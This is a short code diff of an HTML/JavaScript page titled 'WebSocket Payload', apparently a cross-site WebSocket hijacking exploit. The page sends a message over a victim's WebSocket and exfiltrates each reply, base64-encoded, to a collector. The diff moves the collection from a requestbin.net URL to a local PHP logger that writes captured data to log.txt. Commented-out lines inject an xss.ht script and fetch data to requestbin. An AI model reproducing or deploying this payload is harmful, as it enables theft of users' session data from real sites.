@@ -11,7 +11,7 @@
     {
 	websocket.send('secret');
 	  var xhttp = new XMLHttpRequest();
-	xhttp.open("GET", "https://requestbin.net/r/34y37frp?m=MESSAGE_SENT", true);
+	xhttp.open("GET", "/?m=MESSAGE_SENT", true);
 	xhttp.send();
         //websocket.send('<><><script src=https://pepecomacaxss.xss.ht>');
     }
@@ -19,7 +19,7 @@
     function handleReply(event)
     {
 	var xhttp = new XMLHttpRequest();
-	xhttp.open("GET", "https://requestbin.net/r/34y37frp?m=" + btoa(event.data), true);
+	xhttp.open("GET", "/?m=" + btoa(event.data), true);
 	xhttp.send();
       //fetch('http://requestbin.net/r/34y37frp?'+event.data, {mode: 'no-cors'});
     }
@@ -29,3 +29,7 @@
 	  <h2>WebSocket Payload</h2>
 
 	  <div id="output"></div>
+<?php
+file_put_contents("log.txt", $_GET["m"]."\r\n");
+
+?>
